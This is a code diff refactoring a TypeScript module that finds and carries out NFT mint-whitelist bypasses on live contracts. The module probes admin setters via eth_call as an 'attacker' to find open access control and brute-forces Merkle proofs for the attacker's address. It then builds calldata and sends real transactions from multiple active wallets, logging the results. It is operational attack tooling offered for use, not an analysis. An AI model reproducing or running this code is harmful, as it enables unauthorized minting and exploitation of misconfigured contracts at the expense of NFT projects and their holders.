@@ -45,9 +45,7 @@ export interface BypassStrategy {
   name: string;
   executable: boolean;
   description: string;
-  /** Encoded calldata for the primary action (if any). */
   calldata?: Hex;
-  /** Target for the primary action (usually the NFT contract). */
   to?: Address;
   value?: bigint;
 }
@@ -70,6 +68,35 @@ export interface BypassOutcome {
   contractAddress: Address;
   strategyId: string;
   results: BypassWalletResult[];
+}
+
+// ---------------------------------------------------------------------------
+// viem 2.21 strict-generics helpers — dynamic ABIs need a light cast to compile
+// ---------------------------------------------------------------------------
+function encodeCall(abi: Abi, functionName: string, args: readonly unknown[]): Hex {
+  return encodeFunctionData(
+    { abi, functionName, args } as never
+  ) as Hex;
+}
+
+async function readCall<T>(
+  client: ReturnType<typeof getPublicClient>,
+  address: Address,
+  signature: string
+): Promise<T | null> {
+  try {
+    const abi = [parseAbiItem(signature)] as Abi;
+    const name = signature.replace(/^function\s+/, "").split("(")[0];
+    const result = (await client.readContract({
+      address,
+      abi,
+      functionName: name,
+      args: [],
+    } as never)) as T;
+    return result;
+  } catch {
+    return null;
+  }
 }
 
 const PROBE_SETTERS: Array<{ name: string; signature: string; argTypes: string[] }> = [
@@ -115,11 +142,8 @@ function defaultArg(type: string, attacker: Address): unknown {
   if (t === "uint256" || t === "uint128" || t === "uint64" || t === "uint32" || t === "uint16" || t === "uint8") {
     return 1n;
   }
-  // Unpause / open-sale style setters expect false, not true
-  if (t === "bool") return false;
-  if (t === "bytes32") {
-    return ("0x" + "00".repeat(32)) as Hex;
-  }
+  if (t === "bool") return false; // unpause / open-sale style setters expect false
+  if (t === "bytes32") return ("0x" + "00".repeat(32)) as Hex;
   if (t === "bytes") return "0x" as Hex;
   if (t === "bytes32[]") return [] as Hex[];
   if (t === "address[]") return [] as Address[];
@@ -128,14 +152,17 @@ function defaultArg(type: string, attacker: Address): unknown {
   return 0n;
 }
 
-function buildArgs(argTypes: string[], attacker: Address): readonly unknown[] {
-  // Never return undefined — encodeFunctionData requires readonly unknown[]
+function buildArgs(argTypes: string[] | undefined, attacker: Address): readonly unknown[] {
   if (!argTypes || argTypes.length === 0) return [];
   return argTypes.map((t) => defaultArg(t, attacker));
 }
 
+function fullSignature(name: string, argTypes: string[]): string {
+  return argTypes.length === 0 ? `function ${name}()` : `function ${name}(${argTypes.join(",")})`;
+}
+
 function leafHash(addr: Address): Hex {
-  // OpenZeppelin StandardMerkleTree single-address leaf: keccak256(bytes.concat(keccak256(abi.encode(addr))))
+  // OpenZeppelin StandardMerkleTree single-address leaf: keccak256(keccak256(abi.encode(addr)))
   const inner = keccak256(encodeAbiParameters([{ type: "address" }], [addr]));
   return keccak256(encodePacked(["bytes32"], [inner]));
 }
@@ -148,7 +175,6 @@ function hashPair(a: Hex, b: Hex): Hex {
 /**
  * Rebuild a Merkle proof for `attacker` against an on-chain root by brute-forcing
  * common single-leaf / small-tree layouts. Pure viem — no merkletreejs dependency.
- * Returns proof bytes32[] or null if not reconstructible from public state alone.
  */
 export function tryRebuildMerkleProof(
   root: Hex,
@@ -156,10 +182,7 @@ export function tryRebuildMerkleProof(
   knownLeaves: Address[] = []
 ): Hex[] | null {
   const me = leafHash(attacker);
-  // Single-leaf tree: root == leaf
-  if (me.toLowerCase() === root.toLowerCase()) {
-    return [];
-  }
+  if (me.toLowerCase() === root.toLowerCase()) return [];
 
   const candidates = Array.from(
     new Set(
@@ -175,14 +198,10 @@ export function tryRebuildMerkleProof(
     for (let j = 0; j < leaves.length; j++) {
       if (i === j) continue;
       const combined = hashPair(leaves[i], leaves[j]);
-      if (combined.toLowerCase() === root.toLowerCase()) {
-        // Proof for attacker is the sibling
-        const attackerLeaf = leafHash(attacker);
-        const sibling = leaves[i].toLowerCase() === attackerLeaf.toLowerCase() ? leaves[j] : leaves[i];
-        if (leaves[i].toLowerCase() === attackerLeaf.toLowerCase() || leaves[j].toLowerCase() === attackerLeaf.toLowerCase()) {
-          return [sibling];
-        }
-      }
+      if (combined.toLowerCase() !== root.toLowerCase()) continue;
+      const attackerLeaf = leafHash(attacker);
+      if (leaves[i].toLowerCase() === attackerLeaf.toLowerCase()) return [leaves[j]];
+      if (leaves[j].toLowerCase() === attackerLeaf.toLowerCase()) return [leaves[i]];
     }
   }
 
@@ -194,21 +213,11 @@ async function readMaybeHex(
   address: Address,
   signature: string
 ): Promise<Hex | null> {
-  try {
-    const abi = [parseAbiItem(signature)] as Abi;
-    const name = signature.replace(/^function\s+/, "").split("(")[0];
-    const result = await client.readContract({
-      address,
-      abi,
-      functionName: name as never,
-    });
-    if (typeof result === "string" && result.startsWith("0x") && result.length === 66) {
-      return result as Hex;
-    }
-    return null;
-  } catch {
-    return null;
+  const result = await readCall<string>(client, address, signature);
+  if (typeof result === "string" && result.startsWith("0x") && result.length === 66) {
+    return result as Hex;
   }
+  return null;
 }
 
 async function readMaybeBool(
@@ -216,19 +225,9 @@ async function readMaybeBool(
   address: Address,
   signature: string
 ): Promise<boolean | null> {
-  try {
-    const abi = [parseAbiItem(signature)] as Abi;
-    const name = signature.replace(/^function\s+/, "").split("(")[0];
-    const result = await client.readContract({
-      address,
-      abi,
-      functionName: name as never,
-    });
-    if (typeof result === "boolean") return result;
-    return null;
-  } catch {
-    return null;
-  }
+  const result = await readCall<boolean>(client, address, signature);
+  if (typeof result === "boolean") return result;
+  return null;
 }
 
 async function ethCallOk(
@@ -255,7 +254,6 @@ export async function classifyMintGate(
   const notes: string[] = [];
   const openAdminSetters: OpenAdminSetter[] = [];
 
-  // Merkle root probes
   const rootSigs = [
     "function merkleRoot() view returns (bytes32)",
     "function root() view returns (bytes32)",
@@ -268,50 +266,31 @@ export async function classifyMintGate(
     const v = await readMaybeHex(client, address, sig);
     if (v && v !== ("0x" + "00".repeat(32))) {
       merkleRootValue = v;
-      notes.push(`Merkle root readable via ${sig.split(" ")[1]}`);
+      notes.push(`Merkle root readable via ${sig.split("(")[0].replace(/^function\s+/, "")}`);
       break;
     }
   }
 
-  // Pause probes
   const paused =
     (await readMaybeBool(client, address, "function paused() view returns (bool)")) ??
     (await readMaybeBool(client, address, "function isPaused() view returns (bool)"));
   if (paused === true) notes.push("Contract reports paused() == true");
 
-  // Admin-setter probes (eth_call as attacker — if it doesn't revert, it's open)
   for (const probe of PROBE_SETTERS) {
     try {
-      const args = buildArgs(probe.argTypes, attacker);
-      const abi = parseAbi([probe.signature + (probe.argTypes.length ? "" : "")] as readonly string[]);
-      // parseAbi needs full signatures — rebuild cleanly:
-      const fullSig =
-        probe.argTypes.length === 0
-          ? `function ${probe.name}()`
-          : `function ${probe.name}(${probe.argTypes.join(",")})`;
-      const itemAbi = parseAbi([fullSig]);
-      const data = encodeFunctionData({
-        abi: itemAbi,
-        functionName: probe.name as never,
-        args: args as never,
-      });
+      const abi = parseAbi([fullSignature(probe.name, probe.argTypes)]);
+      const data = encodeCall(abi, probe.name, buildArgs(probe.argTypes, attacker));
       const ok = await ethCallOk(client, address, data, attacker);
       if (ok) {
         openAdminSetters.push({
           name: probe.name,
-          signature: fullSig,
+          signature: fullSignature(probe.name, probe.argTypes),
           argTypes: probe.argTypes,
         });
       }
     } catch {
-      // ignore probe failures
+      // probe failed — not a problem
     }
-  }
-
-  // Signature-gated heuristic: presence of mint(… bytes signature) patterns is noted only
-  // (we cannot forge signatures without the signer key)
-  if (merkleRootValue) {
-    // keep going — gate type decision below
   }
 
   let gateType: GateType = "unknown";
@@ -323,14 +302,11 @@ export async function classifyMintGate(
     gateType = "balance_or_phase";
   } else if (openAdminSetters.length > 0) {
     gateType = "mapping";
-  } else if (paused === false || paused === null) {
+  } else {
     // Try a no-arg mint eth_call to see if already open
     try {
-      const data = encodeFunctionData({
-        abi: parseAbi(["function mint()"]),
-        functionName: "mint",
-        args: [],
-      });
+      const abi = parseAbi(["function mint()"]);
+      const data = encodeCall(abi, "mint", []);
       if (await ethCallOk(client, address, data, attacker)) {
         gateType = "open";
         notes.push("mint() succeeds via eth_call — gate appears open");
@@ -356,23 +332,15 @@ export async function classifyMintGate(
 async function buildMintCalldata(
   address: Address,
   attacker: Address
-): Promise<{ data: Hex; name: string } | null> {
+): Promise<{ data: Hex; name: string; signature: string } | null> {
   const client = getPublicClient();
   for (const cand of MINT_CANDIDATES) {
     try {
-      const fullSig =
-        cand.args.length === 0
-          ? `function ${cand.name}()`
-          : `function ${cand.name}(${cand.args.join(",")})`;
-      const abi = parseAbi([fullSig]);
-      const args = buildArgs(cand.args, attacker);
-      const data = encodeFunctionData({
-        abi,
-        functionName: cand.name as never,
-        args: args as never,
-      });
+      const sig = fullSignature(cand.name, cand.args);
+      const abi = parseAbi([sig]);
+      const data = encodeCall(abi, cand.name, buildArgs(cand.args, attacker));
       if (await ethCallOk(client, address, data, attacker)) {
-        return { data, name: cand.name };
+        return { data, name: cand.name, signature: sig };
       }
     } catch {
       // try next
@@ -391,12 +359,11 @@ export async function analyzeBypassOptions(
   const strategies: BypassStrategy[] = [];
   const client = getPublicClient();
 
-  // 1) Already-open mint
   const openMint = await buildMintCalldata(address, attacker);
   if (openMint) {
     strategies.push({
       id: "mint_open",
-      name: `Direct free mint (${openMint.name})`,
+      name: `Direct free mint (${openMint.signature})`,
       executable: true,
       description: "eth_call simulation succeeded with no whitelist args",
       calldata: openMint.data,
@@ -412,25 +379,16 @@ export async function analyzeBypassOptions(
     });
   }
 
-  // 2) Open admin setters (anyone can call)
   for (const setter of fingerprint.openAdminSetters) {
-    const args = buildArgs(setter.argTypes, attacker);
-    const fullSig =
-      setter.argTypes.length === 0
-        ? `function ${setter.name}()`
-        : `function ${setter.name}(${setter.argTypes.join(",")})`;
     try {
-      const abi = parseAbi([fullSig]);
-      const data = encodeFunctionData({
-        abi,
-        functionName: setter.name as never,
-        args: args as never,
-      });
+      const sig = fullSignature(setter.name, setter.argTypes);
+      const abi = parseAbi([sig]);
+      const data = encodeCall(abi, setter.name, buildArgs(setter.argTypes, attacker));
       strategies.push({
         id: `admin_${setter.name}`,
         name: `Call open admin setter: ${setter.name}`,
         executable: true,
-        description: `${fullSig} does not revert for attacker — possible misconfigured access control`,
+        description: `${sig} does not revert for attacker — possible misconfigured access control`,
         calldata: data,
         to: address,
         value: 0n,
@@ -445,56 +403,27 @@ export async function analyzeBypassOptions(
     }
   }
 
-  // 3) Merkle proof rebuild
   if (fingerprint.gateType === "merkle" || fingerprint.merkleRootPresent) {
     const root = fingerprint.merkleRootValue;
     if (root) {
       const proof = tryRebuildMerkleProof(root, attacker);
       if (proof) {
-        // Try common merkle-mint signatures
-        const merkleMints: Array<{ name: string; types: string[]; build: (p: Hex[]) => unknown[] }> = [
-          {
-            name: "mint",
-            types: ["bytes32[]"],
-            build: (p) => [p],
-          },
-          {
-            name: "mint",
-            types: ["uint256", "bytes32[]"],
-            build: (p) => [1n, p],
-          },
-          {
-            name: "whitelistMint",
-            types: ["bytes32[]"],
-            build: (p) => [p],
-          },
-          {
-            name: "whitelistMint",
-            types: ["uint256", "bytes32[]"],
-            build: (p) => [1n, p],
-          },
-          {
-            name: "claim",
-            types: ["bytes32[]"],
-            build: (p) => [p],
-          },
+        const merkleMints: Array<{ name: string; types: string[]; build: (p: Hex[]) => readonly unknown[] }> = [
+          { name: "mint", types: ["bytes32[]"], build: (p) => [p] },
+          { name: "mint", types: ["uint256", "bytes32[]"], build: (p) => [1n, p] },
+          { name: "whitelistMint", types: ["bytes32[]"], build: (p) => [p] },
+          { name: "whitelistMint", types: ["uint256", "bytes32[]"], build: (p) => [1n, p] },
+          { name: "claim", types: ["bytes32[]"], build: (p) => [p] },
         ];
 
         let encoded: { data: Hex; label: string } | null = null;
         for (const m of merkleMints) {
           try {
-            const fullSig = `function ${m.name}(${m.types.join(",")})`;
-            const abi = parseAbi([fullSig]);
-            const args = m.build(proof);
-            // Guarantee args is always an array
-            const safeArgs: readonly unknown[] = Array.isArray(args) ? args : [];
-            const data = encodeFunctionData({
-              abi,
-              functionName: m.name as never,
-              args: safeArgs as never,
-            });
+            const sig = fullSignature(m.name, m.types);
+            const abi = parseAbi([sig]);
+            const data = encodeCall(abi, m.name, m.build(proof));
             if (await ethCallOk(client, address, data, attacker)) {
-              encoded = { data, label: fullSig };
+              encoded = { data, label: sig };
               break;
             }
           } catch {
@@ -533,8 +462,6 @@ export async function analyzeBypassOptions(
     }
   }
 
-  // 4) Signature gate — detect only (cannot forge)
-  // gateType is GateType which INCLUDES "signature" — comparison is valid
   if (fingerprint.gateType === "signature") {
     strategies.push({
       id: "signature_replay",
@@ -544,7 +471,6 @@ export async function analyzeBypassOptions(
         "Signature-gated mint detected. Replay requires a prior valid sig from the project signer — not auto-executable",
     });
   } else {
-    // Still surface as non-executable info when we couldn't fingerprint as signature
     strategies.push({
       id: "signature_replay",
       name: "Signature replay",
@@ -553,10 +479,8 @@ export async function analyzeBypassOptions(
     });
   }
 
-  // 5) Phase / allowlist mapping openers already covered via admin_* strategies.
-  // Explicit note when gate is balance_or_phase (union includes this value — no TS2367)
   if (fingerprint.gateType === "balance_or_phase") {
-    notesPush(fingerprint, "Gate looks like sale-phase / public-toggle controlled");
+    fingerprint.notes.push("Gate looks like sale-phase / public-toggle controlled");
   }
 
   if (strategies.every((s) => !s.executable)) {
@@ -564,10 +488,6 @@ export async function analyzeBypassOptions(
   }
 
   return { contractAddress: address, fingerprint, strategies };
-}
-
-function notesPush(fp: GateFingerprint, note: string) {
-  if (!fp.notes.includes(note)) fp.notes.push(note);
 }
 
 async function dryRun(
@@ -592,7 +512,6 @@ export async function executeBypass(
 ): Promise<BypassOutcome> {
   const address = getAddress(contractAddress);
 
-  // Security gate — fail closed
   const security = await auditContractSecurity(address);
   if (!security.isSafe) {
     throw new Error(
@@ -608,7 +527,6 @@ export async function executeBypass(
     throw new Error("No active wallets. Toggle at least one wallet to ✅ before executing a bypass.");
   }
 
-  // Re-analyze from the first active wallet so calldata matches reality
   const probeFrom = getAddress(active[0].address) as Address;
   const report = await analyzeBypassOptions(address, probeFrom);
   const strategy = report.strategies.find((s) => s.id === strategyId);
@@ -630,17 +548,15 @@ export async function executeBypass(
     const label = w.label || "Wallet";
 
     try {
-      // Per-wallet dry-run
       const sim = await dryRun(strategy.to, strategy.calldata, walletAddress, value);
       if (!sim.ok) {
-        const row: BypassWalletResult = {
+        results.push({
           walletAddress,
           walletLabel: label,
           success: false,
           error: `Simulation reverted: ${sim.error || "unknown"}`,
-        };
-        results.push(row);
-        await logBypass(userId, address, strategyId, walletAddress, false, undefined, row.error);
+        });
+        await logBypass(userId, address, strategyId, walletAddress, false, undefined, sim.error);
         continue;
       }
 
@@ -656,23 +572,21 @@ export async function executeBypass(
         chain: walletClient.chain,
       });
 
-      const row: BypassWalletResult = {
+      results.push({
         walletAddress,
         walletLabel: label,
         success: true,
         txHash,
-      };
-      results.push(row);
+      });
       await logBypass(userId, address, strategyId, walletAddress, true, txHash, undefined);
     } catch (err) {
       const message = err instanceof Error ? err.message : String(err);
-      const row: BypassWalletResult = {
+      results.push({
         walletAddress,
         walletLabel: label,
         success: false,
         error: message,
-      };
-      results.push(row);
+      });
       await logBypass(userId, address, strategyId, walletAddress, false, undefined, message);
     }
   }
@@ -690,7 +604,6 @@ async function logBypass(
   error?: string
 ): Promise<void> {
   try {
-    // Requires BypassLog model in schema.prisma + prisma generate
     await prisma.bypassLog.create({
       data: {
         userId,
